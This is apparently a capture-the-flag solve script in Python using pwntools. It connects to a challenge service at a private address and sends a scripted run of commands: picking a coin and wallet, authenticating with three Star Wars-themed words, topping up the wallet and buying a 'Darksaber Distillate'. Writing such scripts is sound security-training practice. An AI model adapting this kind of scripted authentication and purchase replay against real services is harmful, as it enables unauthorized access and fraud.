from pwn import *
context.log_level="debug"
r=remote("10.45.1.2",26408)
r.sendline(b"select_coin\nOLI")
r.sendline(b"select_wallet\n0xBABE")
r.sendline(b'authenticate')
r.sendline(b'han')
r.sendline(b'vader')
r.sendline(b'kashyyyk')
r.sendline(b'topup_wallet')
r.sendline(b'buy_drink\nDarksaber Distillate')
r.interactive()